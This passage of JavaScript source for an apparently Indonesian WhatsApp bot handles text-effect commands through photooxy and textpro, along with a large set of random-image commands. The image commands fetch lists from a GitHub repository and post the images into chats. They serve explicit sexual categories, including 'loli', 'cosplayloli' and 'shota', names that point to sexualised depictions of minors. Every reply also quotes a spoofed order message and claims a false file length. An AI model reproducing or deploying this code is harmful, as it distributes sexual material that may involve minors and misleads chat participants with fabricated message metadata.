if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/naruto/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
let buttoons = [
{buttonId: `.menu`, buttonText: {displayText: 'Menu'}, type: 1}
]
let buttonMessaage = {
image: { url: dehe }, 
jpegThumbnail: ppnyauser,
caption: `Nih Kak @${sender.split("@")[0]}`,
fileLength: "999999999",
mentions:[sender],
footer: `_Powered By Fαυȥყ_`,
buttons: buttoons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": 'Subscribe YT : FαυȥყRêålz', 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
"sourceUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'
}}
}
kirbotz.sendMessage(m.chat, buttonMessaage, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By Fαυȥყ',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case prefix+'candy': 
case prefix+'christmas': 
case prefix+'3dchristmas': 
case prefix+'sparklechristmas':
case prefix+'deepsea': 
case prefix+'scifi': 
case prefix+'rainbow': 
case prefix+'waterpipe': 
case prefix+'spooky': 
case prefix+'pencil': 
case prefix+'circuit': 
case prefix+'discovery': 
case prefix+'metalic': 
case prefix+'fiction': 
case prefix+'demon': 
case prefix+'transformer': 
case prefix+'berry': 
case prefix+'thunder': 
case prefix+'magma': 
case prefix+'3dstone': 
case prefix+'neonlight': 
case prefix+'glitch': 
case prefix+'harrypotter': 
case prefix+'brokenglass': 
case prefix+'papercut': 
case prefix+'watercolor': 
case prefix+'multicolor': 
case prefix+'neondevil': 
case prefix+'underwater': 
case prefix+'graffitibike':
case prefix+'snow': 
case prefix+'cloud': 
case prefix+'honey': 
case prefix+'ice': 
case prefix+'fruitjuice': 
case prefix+'biscuit': 
case prefix+'wood': 
case prefix+'chocolate': 
case prefix+'strawberry': 
case prefix+'matrix': 
case prefix+'blood': 
case prefix+'dropwater': 
case prefix+'toxic': 
case prefix+'lava': 
case prefix+'rock': 
case prefix+'bloodglas': 
case prefix+'hallowen': 
case prefix+'darkgold': 
case prefix+'joker': 
case prefix+'wicker':
case prefix+'firework': 
case prefix+'skeleton': 
case prefix+'blackpink': 
case prefix+'sand': 
case prefix+'glue': 
case prefix+'1917': 
case prefix+'leaves': {
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Example : ${command} KirBotz`) 
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
let buttoons = [
{buttonId: `.menu`, buttonText: {displayText: 'Menu'}, type: 1}
]
let buttonMessaage = {
image: { url: anu }, 
jpegThumbnail: ppnyauser,
caption: `Nih Kak @${sender.split("@")[0]}`,
fileLength: "999999999",
mentions:[sender],
footer: `_Powered By Fαυȥყ_`,
buttons: buttoons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": 'Subscribe YT : FαυȥყRêålz', 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
"sourceUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'
}}
}
kirbotz.sendMessage(m.chat, buttonMessaage, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By Fαυȥყ',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case prefix+'aesthetic':
case prefix+'ahegao':
case prefix+'akira':
case prefix+'akiyama':
case prefix+'ana':
case prefix+'anjing':
case prefix+'art':
case prefix+'ass':
case prefix+'asuna':
case prefix+'ayuzawa':
case prefix+'bdsm':
case prefix+'boneka':
case prefix+'boruto':
case prefix+'bts':
case prefix+'cecan':
case prefix+'chiho':
case prefix+'chitoge':
case prefix+'cogan':
case prefix+'cosplay':
case prefix+'cosplayloli':
case prefix+'cosplaysagiri':
case prefix+'cuckold':
case prefix+'cum':
case prefix+'cyber':
case prefix+'darkjokes':
case prefix+'deidara':
case prefix+'doraemon':
case prefix+'eba':
case prefix+'elaina':
case prefix+'emilia':
case prefix+'ero':
case prefix+'erza':
case prefix+'exo':
case prefix+'femdom':
case prefix+'foot':
case prefix+'freefire':
case prefix+'gamewallpaper':
case prefix+'gangbang':
case prefix+'gifs':
case prefix+'glasses':
case prefix+'gremory':
case prefix+'hekel':
case prefix+'hentai':
case prefix+'hestia':
case prefix+'hijaber':
case prefix+'hinata':
case prefix+'husbu':
case prefix+'inori':
case prefix+'islamic':
case prefix+'isuzu':
case prefix+'itachi':
case prefix+'itori':
case prefix+'jahy':
case prefix+'jeni':
case prefix+'jiso':
case prefix+'justina':
case prefix+'kaga':
case prefix+'kagura':
case prefix+'kakasih':
case prefix+'kaori':
case prefix+'kartun':
case prefix+'katakata':
case prefix+'keneki':
case prefix+'kotori':
case prefix+'kpop':
case prefix+'kucing':
case prefix+'kurumi':
case prefix+'lisa':
case prefix+'loli':
case prefix+'madara':
case prefix+'masturbation':
case prefix+'megumin':
case prefix+'mikasa':
case prefix+'mikey':
case prefix+'miku':
case prefix+'milf':
case prefix+'minato':
case prefix+'mobil':
case prefix+'motor':
case prefix+'mountain':
case prefix+'naruto':
case prefix+'neko':
case prefix+'neko2':
case prefix+'nekonime':
case prefix+'nezuko':
case prefix+'onepiece':
case prefix+'orgy':
case prefix+'panties':
case prefix+'pentol':
case prefix+'pokemon':
case prefix+'profil':
case prefix+'programming':
case prefix+'pubg':
case prefix+'pussy':
case prefix+'randblackpink':
case prefix+'randomnime':
case prefix+'randomnime2':
case prefix+'rize':
case prefix+'rose':
case prefix+'ryujin':
case prefix+'sagiri':
case prefix+'sakura':
case prefix+'sasuke':
case prefix+'satanic':
case prefix+'shina':
case prefix+'shinka':
case prefix+'shinomiya':
case prefix+'shizuka':
case prefix+'shota':
case prefix+'tatasurya':
case prefix+'technology':
case prefix+'tejina':
case prefix+'tentacles':
case prefix+'thighs':
case prefix+'toukachan':
case prefix+'tsunade':
case prefix+'waifu':
case prefix+'wallhp':
case prefix+'wallml':
case prefix+'wallnime':
case prefix+'yotsuba':
case prefix+'yuki':
case prefix+'yulibocil':
case prefix+'yumeko':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
let heyy
if (/aesthetic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/aesthetic.json')
if (/ahegao/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ahegao.json')
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ana.json')
if (/anjing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/anjing.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/art.json')
if (/ass/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ass.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ayuzawa.json')
if (/bdsm/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/bdsm.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cosplaysagiri.json')
if (/cuckold/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cuckold.json')
if (/cum/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cum.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/cyber.json')
if (/darkjokes/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/darkjokes.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/emilia.json')
if (/ero/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ero.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/femdom.json')
if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/foot.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gamewallpaper.json')
if (/gangbang/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gangbang.json')
if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gifs.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/gremory.json')
if (/hekel/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hekel.json')
if (/hentai/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hentai.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hestia.json')
if (/hijaber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hijaber.json')
if (/hinata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/hinata.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/itori.json')
if (/jahy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jahy.json')
if (/jeni/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kaori.json')
if (/kartun/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kartun.json')
if (/katakata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/katakata.json')
if (/kaneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/madara.json')
if (/masturbation/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/masturbation.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/miku.json')
if (/milf/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/milf.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/minato.json')
if (/mobil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/onepiece.json')
if (/orgy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/orgy.json')
if (/panties/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/panties.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pubg.json')
if (/pussy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/pussy.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/shota.json')
if (/tatasurya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tejina.json')
if (/tentacles/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tentacles.json')
if (/thighs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/thighs.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
let buttoons = [
{buttonId: `.menu`, buttonText: {displayText: 'Menu'}, type: 1}
]
let buttonMessaage = {
image: { url: yeha }, 
jpegThumbnail: ppnyauser,
caption: `Nih Kak @${sender.split("@")[0]}`,
fileLength: "999999999",
mentions:[sender],
footer: `_Powered By Fαυȥყ_`,
buttons: buttoons,
headerType: 4,
contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": 'Subscribe YT : FαυȥყRêålz', 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link',
"sourceUrl": 'https://www.instagram.com/reel/CYKGjBzIw5m/?utm_source=ig_web_copy_link'
}}
}
kirbotz.sendMessage(m.chat, buttonMessaage, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281903153426-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: 'Created By Fαυȥყ',
orderTitle: '999999999', 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
}
break
case prefix+'lirik':{
addCountCmd(`${command.slice(1)}`, sender, _cmd)
if (!q) return reply(`Contoh ${command} judulnya`)
aj = await lirik.lirik(`${q}`)
kirbotz.sendMessage(m.chat, { image: { url : aj.thumb }, caption: 
`*/ Search Lirik \\*

Judul : ${q}
Lirik : ${aj.lirik}` }, { quoted: m } )
}
break
case prefix+'npmstalk':{
